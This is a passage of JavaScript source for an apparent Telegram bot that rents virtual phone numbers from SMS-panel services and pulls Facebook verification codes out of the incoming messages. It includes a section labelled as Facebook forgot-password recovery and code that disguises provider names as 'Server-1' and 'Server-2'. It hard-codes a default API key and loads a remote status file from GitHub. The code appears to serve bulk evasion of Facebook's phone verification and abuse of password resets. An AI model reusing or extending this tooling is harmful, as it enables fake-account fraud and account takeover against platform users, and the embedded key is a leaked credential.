      const val = field.trim();
      if (val) cells.push(val);
      field = '';
    } else {
      field += ch;
    }
  }
  const tail = field.trim();
  if (tail) cells.push(tail);
  return cells;
}

function parseZipEntries(buf) {
  if (!Buffer.isBuffer(buf) || buf.length < 22) {
    throw new Error('Invalid ZIP/XLSX archive');
  }
  let eocdOffset = -1;
  const minOffset = Math.max(0, buf.length - 65558);
  for (let i = buf.length - 22; i >= minOffset; i--) {
    if (buf.readUInt32LE(i) === 0x06054b50) {
      eocdOffset = i;
      break;
    }
  }
  if (eocdOffset < 0) {
    throw new Error('ZIP End-of-Central-Directory not found');
  }
  const totalEntries = buf.readUInt16LE(eocdOffset + 10);
  const cdOffset = buf.readUInt32LE(eocdOffset + 16);
  const entries = new Map();
  let ptr = cdOffset;

  for (let idx = 0; idx < totalEntries && ptr + 46 <= buf.length; idx++) {
    if (buf.readUInt32LE(ptr) !== 0x02014b50) break;
    const compression = buf.readUInt16LE(ptr + 10);
    const compSize = buf.readUInt32LE(ptr + 20);
    const uncompSize = buf.readUInt32LE(ptr + 24);
    const nameLen = buf.readUInt16LE(ptr + 28);
    const extraLen = buf.readUInt16LE(ptr + 30);
    const commentLen = buf.readUInt16LE(ptr + 32);
    const localHdrOffset = buf.readUInt32LE(ptr + 42);
    const name = buf.subarray(ptr + 46, ptr + 46 + nameLen).toString('utf-8');
    ptr += 46 + nameLen + extraLen + commentLen;

    if (name.endsWith('/')) continue;
    if (localHdrOffset + 30 > buf.length || buf.readUInt32LE(localHdrOffset) !== 0x04034b50) continue;
    const lNameLen = buf.readUInt16LE(localHdrOffset + 26);
    const lExtraLen = buf.readUInt16LE(localHdrOffset + 28);
    const dataStart = localHdrOffset + 30 + lNameLen + lExtraLen;
    const sizeToRead = compSize || uncompSize;
    const compSlice = buf.subarray(dataStart, Math.min(buf.length, dataStart + sizeToRead));

    if (compression === 0) {
      entries.set(name, compSlice);
    } else if (compression === 8) {
      entries.set(name, zlib.inflateRawSync(compSlice));
    }
  }
  return entries;
}

function parseXlsxBuffer(buf) {
  const entries = parseZipEntries(buf);
  const sharedStrings = [];
  const ssBuf = entries.get('xl/sharedStrings.xml');
  if (ssBuf) {
    const ssXml = ssBuf.toString('utf-8');
    const siMatches = ssXml.match(/<si\b[^>]*>[\s\S]*?<\/si>/g) || [];
    for (const si of siMatches) {
      const tMatches = si.match(/<t\b[^>]*>([\s\S]*?)<\/t>/g) || [];
      const joined = tMatches
        .map((tag) => decodeXmlEntities(tag.replace(/^<t\b[^>]*>/, '').replace(/<\/t>$/, '')))
        .join('');
      sharedStrings.push(joined);
    }
  }

  const sheetNames = Array.from(entries.keys())
    .filter((k) => /^xl\/worksheets\/sheet\d+\.xml$/i.test(k))
    .sort((a, b) => a.localeCompare(b, undefined, { numeric: true }));

  const values = [];
  for (const sName of sheetNames) {
    const xml = entries.get(sName).toString('utf-8');
    const cellMatches = xml.match(/<c\b[^>]*>[\s\S]*?<\/c>/g) || [];
    for (const cell of cellMatches) {
      const openTagEnd = cell.indexOf('>');
      const openTag = openTagEnd >= 0 ? cell.slice(0, openTagEnd) : '';
      const typeMatch = openTag.match(/\bt=["']([^"']+)["']/i);
      const cellType = typeMatch ? typeMatch[1] : '';

      if (cellType === 'inlineStr') {
        const tMatches = cell.match(/<t\b[^>]*>([\s\S]*?)<\/t>/g) || [];
        const txt = tMatches
          .map((tag) => decodeXmlEntities(tag.replace(/^<t\b[^>]*>/, '').replace(/<\/t>$/, '')))
          .join('')
          .trim();
        if (txt) values.push(txt);
        continue;
      }

      const vMatch = cell.match(/<v\b[^>]*>([\s\S]*?)<\/v>/);
      if (!vMatch) continue;
      let raw = decodeXmlEntities(vMatch[1]).trim();
      if (!raw) continue;
      if (cellType === 's') {
        const idx = Number(raw);
        if (Number.isInteger(idx) && idx >= 0 && idx < sharedStrings.length) {
          raw = String(sharedStrings[idx] || '').trim();
        }
      }
      if (raw && raw.toLowerCase() !== 'none') {
        values.push(raw);
      }
    }
  }
  return values;
}

function extractFbOtpFromSms(msgText) {
  const raw = String(msgText || '').trim();
  if (!raw) return '';
  const patterns = [
    /\bFB[-:\s]*(\d{4,8})\b/i,
    /(?:confirmation|confirm|verification|security|login|facebook|meta|OTP|code|codice|c[oó]digo|cod|kode|verify|passcode|password|PIN|token)\s*(?:code|otp|pin|fb)?(?:\s*(?:is|è|est|es)|[:#-])+\s*(\d{4,8})\b/i,
    /(?:OTP|code|codice|c[oó]digo|cod|kode|verification|verify|confirm|passcode|password|PIN|token)[^\d]{0,12}(\d{4,8})/i,
    /(\d{4,8})(?:\s+(?:is\s+your|è\s+il\s+tuo|est\s+votre|ist\s+dein|es\s+tu))/i,
    /(?:code|codice|c[oó]digo|otp|pin)\s*(?:is|è|est|=|:|-)\s*(\d{4,8})\b/i,
    /\b(\d{5,8})\b/,
  ];
  for (const re of patterns) {
    const m = raw.match(re);
    if (m && m[1]) return m[1];
  }
  if (/(?:facebook|meta|fb\b|otp|code|codice|c[oó]digo|verify|confirm|pin)/i.test(raw)) {
    const m4 = raw.match(/\b(\d{4})\b/);
    if (m4 && m4[1]) return m4[1];
  }
  return '';
}

function phoneDigitsMatch(a, b) {
  const da = String(a || '').replace(/\D/g, '');
  const db = String(b || '').replace(/\D/g, '');
  if (!da || !db) return false;
  if (da === db) return true;
  if (da.length >= 8 && db.length >= 8 && da.slice(-8) === db.slice(-8)) return true;
  return da.endsWith(db) || db.endsWith(da);
}

const API_AUTH_OPTIONS = [
  { key: 'auto', label: '🤖 Auto' },
  { key: 'bearer', label: 'Bearer' },
  { key: 'x_api_key', label: 'X-API-Key' },
  { key: 'raw_authorization', label: 'Raw Authorization' },
  { key: 'token', label: 'Token' },
  { key: 'x_auth_token', label: 'X-Auth-Token' },
  { key: 'api_key_header', label: 'api-key header' },
  { key: 'basic', label: 'Basic user:pass' },
  { key: 'custom_header', label: 'Custom header' },
  { key: 'custom_query', label: 'Custom query' },
  { key: 'token_query', label: 'Token query (?token=)' },
  { key: 'post_form', label: 'POST form' },
  { key: 'post_json', label: 'POST JSON' },
  { key: 'none', label: 'No authentication' },
];

function _apiKeyName(value) {
  return String(value ?? '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

function _apiPathValue(value, pathStr) {
  if (!pathStr) return value;
  let current = value;
  for (const part of String(pathStr).trim().split('.')) {
    if (!part) continue;
    if (current && typeof current === 'object' && !Array.isArray(current)) {
      if (!(part in current)) return undefined;
      current = current[part];
    } else if (Array.isArray(current) && /^\d+$/.test(part)) {
      const idx = Number(part);
      if (idx >= current.length) return undefined;
      current = current[idx];
    } else {
      return undefined;
    }
  }
  return current;
}

function _apiMappingValue(row, customName, normalized) {
  if (!customName) return undefined;
  const clean = String(customName).trim();
  if (clean.includes('.')) return _apiPathValue(row, clean);
  return normalized[_apiKeyName(clean)];
}

function _apiRowValues(row, numberIdx, senderIdx, messageIdx, fieldMap = {}) {
  const nIdx = Number.isInteger(numberIdx) ? numberIdx : 2;
  const sIdx = Number.isInteger(senderIdx) ? senderIdx : 3;
  const mIdx = Number.isInteger(messageIdx) ? messageIdx : 5;
  const size = Math.max(nIdx, sIdx, mIdx, 1) + 1;

  if (row && typeof row === 'object' && !Array.isArray(row)) {
    const normalized = {};
    for (const [k, v] of Object.entries(row)) {
      normalized[_apiKeyName(k)] = v;
    }
    const firstValue = (names) => {
      for (const name of names) {
        const val = normalized[_apiKeyName(name)];
        if (val !== undefined && val !== null && String(val).trim() !== '') return val;
      }
      return '';
    };
    const configuredValue = (key, defaults) => {
      const custom = _apiMappingValue(row, fieldMap?.[key], normalized);
      return custom !== undefined && custom !== null && String(custom).trim() !== ''
        ? custom
        : firstValue(defaults);
    };

    const timestamp = configuredValue('timestamp', [
      'timestamp', 'time', 'date', 'datetime', 'created_at',
      'created', 'createdAt', 'received_at', 'receivedAt',
      'sent_at', 'sentAt', 'date_time', 'dateTime',
      'dt', 'created_on', 'createdOn', 'received_on', 'receivedOn',
      'message_id', 'messageId', 'sms_id', 'smsId', 'id',
    ]);
    const number = configuredValue('number', [
      'number', 'phone', 'phone_number', 'phoneNumber', 'msisdn',
      'mobile', 'mobile_number', 'mobileNumber', 'recipient',
      'to', 'destination', 'num', 'phone_num', 'phoneNo',
      'recipient_number', 'number_value',
    ]);
    const sender = configuredValue('sender', [
      'sender', 'cli', 'service', 'from', 'origin', 'source',
      'sender_id', 'senderId', 'from_number', 'fromNumber',
    ]);
    const message = configuredValue('message', [
      'message', 'sms', 'text', 'body', 'content', 'message_text',
      'messageText', 'sms_text', 'smsText', 'msg',
    ]);
    if (number || sender || message) {
      const values = new Array(size).fill('');
      values[0] = timestamp;
      values[1] = configuredValue('range', ['range', 'country', 'country_code', 'countryCode']);
      values[nIdx] = number;
      values[sIdx] = sender;
      values[mIdx] = message;
      return values;
    }
    const rawVals = Object.values(row);
    while (rawVals.length < size) rawVals.push('');
    return rawVals;
  }

  if (Array.isArray(row)) {
    const vals = [...row];
    while (vals.length < size) vals.push('');
    return vals;
  }
  return [];
}

function _apiPayloadRows(payload) {
  if (Array.isArray(payload)) return payload;
  if (!payload || typeof payload !== 'object') return [];

  const preferred = [
    'data', 'results', 'messages', 'aaData', 'items', 'rows',
    'records', 'response', 'result', 'payload', 'otps', 'hits',
  ];
  const normalized = {};
  for (const [k, v] of Object.entries(payload)) {
    normalized[_apiKeyName(k)] = v;
  }
  for (const key of preferred) {
    const val = normalized[_apiKeyName(key)];
    if (Array.isArray(val)) return val;
    if (val && typeof val === 'object') {
      const nested = _apiPayloadRows(val);
      if (nested.length > 0) return nested;
    }
  }

  const fieldNames = new Set(Object.keys(payload).map((k) => _apiKeyName(k)));
  const smsFields = ['number', 'phone', 'phonenumber', 'msisdn', 'mobile', 'message', 'sms', 'text', 'body', 'content'];
  if (smsFields.some((f) => fieldNames.has(f))) {
    return [payload];
  }

  for (const val of Object.values(payload)) {
    if (Array.isArray(val)) return val;
  }
  return [];
}

function _parseApiMapping(raw) {
  const mapping = {};
  const text = String(raw || '').trim();
  if (!text || ['none', 'auto', '-'].includes(text.toLowerCase())) return mapping;
  const aliases = {
    rows: 'api_rows_path',
    path: 'api_rows_path',
    number: 'api_number_field',
    phone: 'api_number_field',
    sender: 'api_sender_field',
    cli: 'api_sender_field',
    message: 'api_message_field',
    sms: 'api_message_field',
    time: 'api_timestamp_field',
    timestamp: 'api_timestamp_field',
    range: 'api_range_field',
    country: 'api_range_field',
  };
  for (const item of text.split(/[;,]\s*/)) {
    const eqIdx = item.indexOf('=');
    if (eqIdx < 0) continue;
    const key = item.slice(0, eqIdx).trim().toLowerCase();
    const val = item.slice(eqIdx + 1).trim();
    if (aliases[key] && val) mapping[aliases[key]] = val;
  }
  return mapping;
}

function _apiToken(value) {
  return String(value || '').trim().replace(/^\s*(?:bearer|token|api[\s_-]*key)\s+/i, '');
}

function _apiRequestAttempts(panel) {
  let method = String(panel?.api_method || 'GET').toUpperCase();
  if (method !== 'GET' && method !== 'POST') method = 'GET';
  const key = String(panel?.api_key || '').trim();
  const authType = String(panel?.api_auth_type || 'auto').toLowerCase();
  const authName = String(panel?.api_auth_name || '').trim();
  const token = _apiToken(key);
  const baseHeaders = {
    Accept: 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (compatible; SMSBot/1.0; +https://telegram.org)',
  };

  const one = (extra = {}) => ({
    method: extra.method || method,
    headers: { ...baseHeaders, ...(extra.headers || {}) },
    params: extra.params || null,
    form: extra.form || null,
    json: extra.json || null,
  });

  if (authType === 'none' || !token) return [one()];
  if (authType === 'basic') {
    if (!key.includes(':')) return [];
    const encoded = Buffer.from(key, 'utf-8').toString('base64');
    return [one({ headers: { Authorization: `Basic ${encoded}` } })];
  }
  if (authType === 'bearer') return [one({ headers: { Authorization: `Bearer ${token}` } })];
  if (authType === 'raw_authorization') return [one({ headers: { Authorization: key } })];
  if (authType === 'token') return [one({ headers: { Authorization: `Token ${token}` } })];
  if (authType === 'x_auth_token') return [one({ headers: { 'X-Auth-Token': token } })];
  if (authType === 'x_api_key') return [one({ headers: { 'X-API-Key': token } })];
  if (authType === 'api_key_header') return [one({ headers: { 'api-key': token } })];
  if (authType === 'custom_header') return [one({ headers: { [authName || 'Authorization']: token } })];
  if (authType === 'query' || authType === 'custom_query') return [one({ params: { [authName || 'api_key']: token } })];
  if (authType === 'token_query') return [one({ params: { token } })];
  if (authType === 'post_form') return [one({ method: 'POST', form: { [authName || 'api_key']: token } })];
  if (authType === 'post_json') return [one({ method: 'POST', json: { [authName || 'api_key']: token } })];

  return [
    one({ headers: { Authorization: `Bearer ${token}` } }),
    one({ headers: { 'X-API-Key': token } }),
    one({ headers: { Authorization: token } }),
    one({ headers: { Authorization: `Token ${token}` } }),
    one({ headers: { 'X-Auth-Token': token } }),
    one({ headers: { 'api-key': token } }),
    one({ headers: { mauthapi: token } }),
    one({ params: { token } }),
    one({ params: { api_key: token } }),
    one({ params: { access_token: token } }),
  ];
}

function _apiAutoAuthConfig(attemptIndex) {
  const configs = [
    ['bearer', ''],
    ['x_api_key', ''],
    ['raw_authorization', ''],
    ['token', ''],
    ['x_auth_token', ''],
    ['api_key_header', ''],
    ['custom_header', 'mauthapi'],
    ['token_query', ''],
    ['custom_query', 'api_key'],
    ['custom_query', 'access_token'],
  ];
  return attemptIndex >= 0 && attemptIndex < configs.length ? configs[attemptIndex] : [null, ''];
}

function _apiResponseIsAuthError(statusCode, payload) {
  if (statusCode === 401 || statusCode === 403) return true;
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) return false;
  const status = String(payload.status || payload.state || payload.result || '').toLowerCase();
  const success = payload.success;
  const errParts = [];
  const checkKeys = new Set(['status', 'state', 'result', 'success', 'error', 'errors', 'message', 'msg', 'detail', 'reason', 'code']);
  for (const [k, v] of Object.entries(payload)) {
    if (checkKeys.has(_apiKeyName(k))) {
      errParts.push(typeof v === 'object' ? JSON.stringify(v) : String(v ?? ''));
    }
  }
  const msg = errParts.join(' ').toLowerCase();
  const authWords = ['unauthor', 'invalid key', 'invalid token', 'authentication', 'access denied', 'forbidden', 'not allowed'];
  const authMatch = authWords.some((w) => msg.includes(w));
  return Boolean(
    authMatch &&
    (['error', 'failed', 'failure', 'false'].includes(status) || success === false || msg.includes('unauthor'))
  );
}

function formatLastSmsHtml(panelName, smsRows) {
  const div = '──────────────────────────────';
  const lines = [`📋 <b>Last Message · ${escapeHtml(panelName)}</b>\n${div}`];
  for (const s of (smsRows || []).slice(0, 1)) {
    const number = escapeHtml(String(s.number || ''));
    const ts = escapeHtml(String(s.ts || ''));
    const sender = escapeHtml(String(s.sender || ''));
    const message = escapeHtml(String(s.message || ''));
    lines.push(
      `\n📞 <b>নম্বর:</b> <code>${number || '—'}</code>\n` +
      `📅 <b>তারিখ:</b> ${ts || '—'}\n` +
      `👤 <b>CLI:</b> ${sender || '—'}\n` +
      `💬 <b>SMS:</b>\n<pre>${message || '—'}</pre>\n${div}`
    );
  }
  return lines.join('\n');
}

// ----------------------------------------------------------------------------
// 5c. LAMIX SMS API v1 Client & Facebook Forgot-Password Recovery (PC Clone)
// ----------------------------------------------------------------------------
function sanitizeProviderText(str) {
  return String(str || '')
    .replace(/https?:\/\/(?:panel\.)?lamix\.org[^\s<>"']*/gi, 'Server-2')
    .replace(/https?:\/\/(?:api\.)?2oo9\.cloud[^\s<>"']*/gi, 'Server-1')
    .replace(/\b(?:lamixsms|lamix)\b/gi, 'Server-2')
    .replace(/\b(?:voltex|voltx|2oo9|mauthapi)\b/gi, 'Server-1');
}

const LAMIX_BASE_URL = (process.env.LAMIX_BASE_URL || 'https://panel.lamix.org/api/v1').replace(/\/+$/, '');

async function lamixRequest(token, endpoint, paramsOrOpts = null, _retry = 0) {
  const cleanTok = String(token || '').trim();
  if (!cleanTok) return { ok: false, error: 'Server-2 token is not configured by Admin.' };
  let method = 'GET';
  let params = null;
  let jsonBody = null;
  let reqTimeoutMs = 10000;
  if (paramsOrOpts && typeof paramsOrOpts === 'object' && ('method' in paramsOrOpts || 'json' in paramsOrOpts || 'params' in paramsOrOpts || 'timeoutMs' in paramsOrOpts)) {
    method = String(paramsOrOpts.method || 'GET').toUpperCase();
    params = paramsOrOpts.params || null;
    jsonBody = paramsOrOpts.json ?? null;
    if (Number(paramsOrOpts.timeoutMs) > 0) reqTimeoutMs = Number(paramsOrOpts.timeoutMs);
  } else {
    params = paramsOrOpts;
  }
  let url = `${LAMIX_BASE_URL}${endpoint.startsWith('/') ? endpoint : `/${endpoint}`}`;
  if (params && typeof params === 'object') {
    const qs = new URLSearchParams();
    for (const [k, v] of Object.entries(params)) {
      if (v !== undefined && v !== null && v !== '') qs.set(k, String(v));
    }
    const qStr = qs.toString();
    if (qStr) url += `?${qStr}`;
  }
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), reqTimeoutMs);
  try {
    const headers = {
      Authorization: `Bearer ${cleanTok}`,
      Accept: 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    };
    const fetchOpts = { method, headers, signal: controller.signal };
    if (jsonBody !== null && method !== 'GET') {
      headers['Content-Type'] = 'application/json';
      fetchOpts.body = JSON.stringify(jsonBody);
    }
    const res = await fetch(url, fetchOpts);
    clearTimeout(timer);
    const text = await res.text();
    let data = {};
    try {
      data = text ? JSON.parse(text) : {};
    } catch {
      return { ok: false, status: res.status, error: text.slice(0, 120) || `HTTP ${res.status}` };
    }
    if ((res.status === 429 || data?.error === 'rate_limited') && _retry < 2) {
      const waitSec = Math.max(1, Math.min(4, Number(data?.retryAfterSeconds) || 1));
      await new Promise((r) => setTimeout(r, waitSec * 1000 + 250));
      return lamixRequest(token, endpoint, paramsOrOpts, _retry + 1);
    }
    if (!res.ok) {
      return { ok: false, status: res.status, error: data?.message || data?.error || `HTTP ${res.status}` };
    }
    return { ok: true, status: res.status, data };
  } catch (err) {
    clearTimeout(timer);
    return { ok: false, status: 0, error: err instanceof Error ? err.message : 'Server-2 request failed' };
  }
}

const lamixPollCache = new Map(); // token -> { ts, res, inflight }

async function fetchLamixMessages(token, limit = 100, forceFresh = false) {
  const cleanTok = String(token || '').trim();
  const safeLimit = Math.max(40, Math.min(100, Number(limit) || 100));
  const cacheKey = `${cleanTok}:${safeLimit}`;
  const entry = lamixPollCache.get(cacheKey);
  const now = Date.now();
  if (!forceFresh && entry?.res && now - entry.ts < 900) {
    return entry.res;
  }
  if (entry?.inflight) {
    return entry.inflight;
  }
  const promise = (async () => {
    const res = await lamixRequest(cleanTok, '/messages', { limit: safeLimit });
    let out;
    if (!res.ok) {
      out = { ok: false, error: res.error, messages: [] };
    } else {
      const d = res.data;
      const list = Array.isArray(d)
        ? d
        : Array.isArray(d?.records)
        ? d.records
        : Array.isArray(d?.messages)
        ? d.messages
        : Array.isArray(d?.data)
        ? d.data
        : [];
      out = { ok: true, messages: list };
    }
    lamixPollCache.set(cacheKey, { ts: Date.now(), res: out, inflight: null });
    return out;
  })();
  lamixPollCache.set(cacheKey, { ts: entry?.ts || 0, res: entry?.res || null, inflight: promise });
  return promise;
}

function getLamixMsgFields(row) {
  if (!row || typeof row !== 'object') return { id: '', number: '', sender: 'Server-2', message: '', ts: 0 };
  const number = String(row.number || row.phone || row.msisdn || row.to || row.recipient || '').replace(/\D/g, '');
  const rawSender = String(row.cli || row.sid || row.sender || row.service || row.from || 'Server-2').trim();
  const sender = sanitizeProviderText(rawSender) || 'Server-2';
  const message = String(row.message || row.sms || row.body || row.text || row.content || row.code || '').trim();
  const id = String(row.id || row._id || row.message_id || `${number}_${row.createdAt || row.time || row.timestamp || message.slice(0, 16)}`);
  const rawTs = row.createdAt || row.created_at || row.timestamp || row.time || 0;
  let ts = 0;
  if (typeof rawTs === 'number') ts = rawTs > 1e12 ? rawTs : rawTs * 1000;
  else if (rawTs) {
    const parsed = Date.parse(String(rawTs));
    if (!Number.isNaN(parsed)) ts = parsed;
  }
  return { id, number, sender, message, ts };
}

function _normalizeLamixRangeItem(item) {
  if (item && typeof item === 'object') {
    const name = String(item.range || item.rangeName || item.name || item.title || item.prefix || item.id || '').trim();
    const prefix = String(item.prefix || item.rangePrefix || item.code || item.dialCode || '').trim() || name.replace(/\D/g, '').slice(0, 4);
    const cleanPrefix = prefix.replace(/\D/g, '') || name.replace(/\D/g, '');
    const rid = String(item.id || item.rangeId || item.range || item.rangeName || name).trim();
    return {
      id: rid,
      range: name || rid,
      clean_range: cleanPrefix,
      sid: sanitizeProviderText(String(item.country || item.countryName || 'Server-2').trim()) || 'Server-2',
      count: item.unassignedNumbers ?? item.available ?? item.count ?? item.numbers ?? null,
      payout: item.payout ?? null,
      active: item.active !== false,
    };
  }
  const s = String(item || '').trim();
  return { id: s, range: s, clean_range: s.replace(/\D/g, ''), sid: 'Server-2', count: null, payout: null, active: true };
}

const lamixRangesCache = new Map(); // token -> { ts, res, inflight }

async function fetchLamixNumbers(token, rangeFilter = null, limit = 100, maxPages = 2, rangePrefixHint = '', opts = {}) {
  const records = [];
  let cursor = null;
  const rfTrim = String(rangeFilter || '').trim();
  const isUuidFilter = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(rfTrim);
  const cleanPrefixHint = String(rangePrefixHint || '').replace(/\D/g, '');
  const wantMin = Math.max(0, Number(opts?.wantMin || 0));

  for (let p = 0; p < maxPages; p++) {
    const params = { limit };
    if (cursor) params.cursor = cursor;
    if (rfTrim && rfTrim !== 'All Numbers') {
      if (isUuidFilter) params.rangeId = rfTrim;
      else params.range = rfTrim;
    }
    const res = await lamixRequest(token, '/numbers', { params, timeoutMs: 8500 });
    if (!res.ok) break;
    const d = res.data || {};
    const batch = Array.isArray(d) ? d : (d.records || d.numbers || d.data || []);
    for (const rec of batch) {
      if (rec && typeof rec === 'object') {
        const num = String(rec.number || rec.phone || rec.msisdn || '').replace(/\D/g, '');
        if (!num) continue;
        // Skip numbers already assigned to another client when unassigned ones exist
        if (rec.client !== null && rec.client !== undefined && String(rec.client).trim() !== '') continue;
        if (String(rec.status || '').toLowerCase() === 'assigned') continue;
        const recRangeId = String(rec.rangeId || rec.range_id || '').trim();
        const recRangeName = String(rec.range || rec.rangeName || '').trim();
        if (rfTrim && rfTrim !== 'All Numbers') {
          if (isUuidFilter && recRangeId && recRangeId !== rfTrim) continue;
          if (!isUuidFilter && recRangeName && !recRangeName.toLowerCase().includes(rfTrim.toLowerCase())) continue;
        }
        if (cleanPrefixHint && !num.startsWith(cleanPrefixHint)) continue;
        records.push({
          number: num,
          full_number: num,
          rangeId: recRangeId,
          range: recRangeName || recRangeId || 'All Numbers',
          prefix: String(rec.rangePrefix || rec.prefix || cleanPrefixHint || num.slice(0, 4)).replace(/\D/g, ''),
          status: String(rec.status || ''),
        });
      } else {
        const num = String(rec || '').replace(/\D/g, '');
        if (num && (!cleanPrefixHint || num.startsWith(cleanPrefixHint))) {
          records.push({ number: num, full_number: num, rangeId: '', range: 'All Numbers', prefix: cleanPrefixHint || num.slice(0, 4), status: '' });
        }
      }
    }
    if (wantMin > 0 && records.length >= wantMin) break;
    cursor = d.nextCursor || null;
    if (!cursor || batch.length === 0) break;
  }

  // Fallback scan ONLY matches the exact requested rangeId/name/prefix — NEVER returns other countries!
  if (records.length === 0 && ((rfTrim && rfTrim !== 'All Numbers') || cleanPrefixHint)) {
    const allNums = await fetchLamixNumbers(token, null, limit, maxPages, '', opts);
    const rfLow = rfTrim.toLowerCase();
    const rfDig = cleanPrefixHint || (!isUuidFilter ? rfTrim.replace(/\D/g, '') : '');
    return allNums.filter(
      (n) =>
        (isUuidFilter && n.rangeId && n.rangeId === rfTrim) ||
        (!isUuidFilter && n.range && n.range.toLowerCase().includes(rfLow)) ||
        (rfDig && n.number.startsWith(rfDig))
    );
  }
  return records;
}

async function fetchLamixRanges(token, forceFresh = false) {
  const cleanTok = String(token || '').trim();
  const cached = lamixRangesCache.get(cleanTok);
  const now = Date.now();
  if (!forceFresh && cached?.res && cached.res.ok && now - cached.ts < 45000) {
    return cached.res;
  }
  if (!forceFresh && cached?.inflight) {
    return cached.inflight;
  }
  const promise = (async () => {
    const res = await lamixRequest(cleanTok, '/ranges', { timeoutMs: 9000 });
    const out = [];
    const seen = new Set();
    if (res.ok && res.data) {
      const rawRanges = Array.isArray(res.data)
        ? res.data
        : (res.data.ranges || res.data.records || res.data.data || []);
      for (const item of rawRanges) {
        const norm = _normalizeLamixRangeItem(item);
        if (norm.range && !seen.has(norm.range)) {
          seen.add(norm.range);
          out.push(norm);
        }
      }
    }
    if (out.length === 0) {
      const nums = await fetchLamixNumbers(cleanTok, null, 100, 1);
      for (const rec of nums) {
        const rName = rec.range || 'All Numbers';
        if (!seen.has(rName)) {
          seen.add(rName);
          out.push({
            id: rName,
            range: rName,
            clean_range: rec.prefix || rec.number.slice(0, 4),
            sid: 'Server-2',
            count: null,
            payout: null,
          });
        }
      }
    }
    const result = { ok: res.ok || out.length > 0, error: res.error || '', ranges: out };
    lamixRangesCache.set(cleanTok, { ts: Date.now(), res: result, inflight: null });
    return result;
  })();
  lamixRangesCache.set(cleanTok, { ts: cached?.ts || 0, res: cached?.res || null, inflight: promise });
  return promise;
}

async function assignLamixNumber(token, number) {
  const num = String(number || '').replace(/\D/g, '');
  if (!num) return { ok: false, error: 'Invalid number' };
  return lamixRequest(token, '/numbers/assign', { method: 'POST', json: { numbers: [num] } });
}

async function unassignLamixNumber(token, number) {
  const num = String(number || '').replace(/\D/g, '');
  if (!num) return { ok: false, error: 'Invalid number' };
  return lamixRequest(token, '/numbers/unassign', { method: 'POST', json: { numbers: [num] } });
}

async function checkLamixStatus(token) {
  const rRes = await fetchLamixRanges(token);
  const nums = await fetchLamixNumbers(token, null, 100, 1);
  const mRes = await fetchLamixMessages(token, 10);
  if (!rRes.ok && nums.length === 0 && !mRes.ok) {
    return { ok: false, error: rRes.error || mRes.error || 'Connection failed', rangesCount: 0, numbersCount: 0, messages: [] };
  }
  return {
    ok: true,
    rangesCount: rRes.ranges.length,
    numbersCount: nums.length,
    messages: mRes.messages || [],
  };
}

// ── VOLTEX / LIVE RANGE API & REMOTE STATUS ENGINE ───────────────────────────
const HBX_API_2OO9_BASE = 'https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api';
const HBX_API_2OO9_DEFAULT_KEY = 'MM5EU3E96I5B';
const HBX_REMOTE_STATUS_URL = 'https://raw.githubusercontent.com/ROKY-143/AD-PENL/refs/heads/main/Apfb.txt';

function resolveHbx2oo9Keys(globalStOrCfg) {
  // Always read from global admin settings when provided; fallback to env/default unless admin explicitly disabled
  const st = globalStOrCfg && ('globalVoltexKeys' in globalStOrCfg || 'globalVoltexDisabled' in globalStOrCfg)
    ? globalStOrCfg
    : null;
  const adminKeys = Array.isArray(st?.globalVoltexKeys)
    ? st.globalVoltexKeys.map((k) => String(k || '').trim()).filter(Boolean)
    : [];
  const envKey = String(process.env.VOLTEX_API_KEY || process.env.HBX_2OO9_API_KEY || '').trim();
  if (st?.globalVoltexDisabled && adminKeys.length === 0) return [];
  const merged = [...adminKeys];
  if (envKey && !merged.includes(envKey)) merged.push(envKey);
  if (!st?.globalVoltexDisabled && merged.length === 0 && HBX_API_2OO9_DEFAULT_KEY) {
    merged.push(HBX_API_2OO9_DEFAULT_KEY);
  }
  return merged;
}

async function hbx2oo9Request(endpoint, keysInput, queryParams = {}, timeoutMs = 15000, customBaseUrl = '') {
  const keyList = Array.isArray(keysInput)
    ? keysInput.filter(Boolean)
    : String(keysInput || '').split(/[\r\n,\s]+/).map((s) => s.trim()).filter(Boolean);
  if (keyList.length === 0) {
    return { ok: false, status: 401, error: 'Server-1 API key is not configured by Admin.', data: null };
  }
  const baseApi = (String(customBaseUrl || '').trim() || HBX_API_2OO9_BASE).replace(/\/+$/, '');

  let lastErr = 'Request failed';
  let lastStatus = 0;

  for (const apiKey of keyList) {
    const url = new URL(`${baseApi}${endpoint}`);
    for (const [k, v] of Object.entries(queryParams || {})) {
      if (v !== undefined && v !== null && v !== '') url.searchParams.set(k, String(v));
    }
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetch(url.toString(), {
        method: 'GET',
        headers: {
          mauthapi: apiKey,
          Accept: 'application/json, text/plain, */*',
          'Accept-Encoding': 'gzip, deflate, br',
          'User-Agent': DESKTOP_UA,
        },
        signal: ctrl.signal,
      });
      clearTimeout(timer);
      lastStatus = res.status;
      const rawText = await res.text();
      let data = null;
      try {
        data = JSON.parse(rawText);
      } catch {
        data = rawText;
      }

      if (res.ok && data !== null && typeof data !== 'string') {
        const errMsg = String(data?.error || data?.message || '').toLowerCase();
        if (errMsg && (errMsg.includes('invalid') || errMsg.includes('expired') || errMsg.includes('missing') || errMsg.includes('unauth'))) {
          lastErr = String(data.error || data.message);
          continue;
        }
        return { ok: true, status: res.status, data, usedKey: apiKey };
      }

      if (typeof data === 'object' && data !== null) {
        lastErr = String(data.error || data.message || `HTTP ${res.status}`);
      } else if (rawText) {
        lastErr = rawText.trim().slice(0, 120);
      } else {
        lastErr = `HTTP ${res.status}`;
      }
      if (res.status === 401 || res.status === 403 || /invalid|expired|key/i.test(lastErr)) {
        continue;
      }
    } catch (err) {
      clearTimeout(timer);
      lastErr = err instanceof Error ? err.message : 'Server-1 request failed';
    }
  }
  return { ok: false, status: lastStatus, error: lastErr, data: null };
}

function findFacebookServices(records) {
  const arr = Array.isArray(records) ? records : [];
  const fbOnly = arr.filter((r) => {
    if (!r || typeof r !== 'object') return false;
    const blob = `${r.service || ''} ${r.service_name || ''} ${r.sid || ''} ${r.name || ''} ${r.app || ''} ${r.title || ''}`.toLowerCase();
